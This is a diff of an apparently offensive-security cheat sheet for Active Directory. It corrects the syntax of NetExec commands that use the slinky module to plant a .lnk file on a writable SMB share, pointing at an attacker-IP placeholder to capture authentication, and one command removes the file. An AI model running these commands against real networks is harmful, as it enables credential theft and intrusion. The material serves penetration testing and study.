@@ -623,12 +623,12 @@ pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP>
   
   ### Creates a lnk file for a share with read/write rights
   ```shell
-  NetExec -smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP>
+  NetExec smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP>
   ```
    
   ### Remove the lnk file
   ```shell
-  NetExec -smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
+  NetExec smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
   ```
     
 </details>
